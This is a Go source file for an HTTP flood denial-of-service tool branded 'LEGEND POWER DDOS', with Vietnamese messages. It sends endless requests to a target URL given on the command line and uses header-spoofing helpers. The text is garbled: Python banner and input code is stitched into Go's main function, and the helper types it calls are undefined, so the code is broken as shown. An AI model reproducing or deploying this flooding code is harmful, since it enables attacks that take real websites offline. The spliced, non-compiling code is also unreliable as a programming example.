package main

import(
  "crypto/tls"
  "log"
  "os"
  "strconv"

  "github.com/valyala/fasthttp"
)

var target struct{
  url string
  threads int
  method string
  a_type string
}

func httpflood(){
  head := header{"false", nil}
  sp := spoof{"127.0.0.1", 5}
  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
  req := fasthttp.AcquireRequest()
  req.SetRequestURI(target.url)
  req.Header.SetMethod(target.method)
  head.headers(req)
  sp.spoofS(req)
  for{
    client.Do(req, nil)
  }
}

func main(){
  target.url = os.Args[1]
  target.method = os.Args[2]
  threads, _ := strconv.Atoi(os.Args[3])
  log.Print("Bắt Đầu...")
panel = """
         [..              [..                 
         [..              [..                 
         [..[.. [..       [..[. [...   [..    
         [.. [..  [.. [.. [.. [..    [..  [.. 
         [.. [..  [..[.   [.. [..   [..   [.. 
         [.. [..  [..[.   [.. [..   [..   [.. 
         [..[...  [.. [.. [..[...     [.. [...
                                                                                            
                                                      LEGEND POWER DDOS BY NGUYỄN THÀNH VINH
"""
print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(panel)))
print()
host=input(Colorate.Diagonal(Colors.red_to_yellow, "   Đang Tấn Công: "))
    go httpflood()
  }

  <- make(chan bool, 1)
}
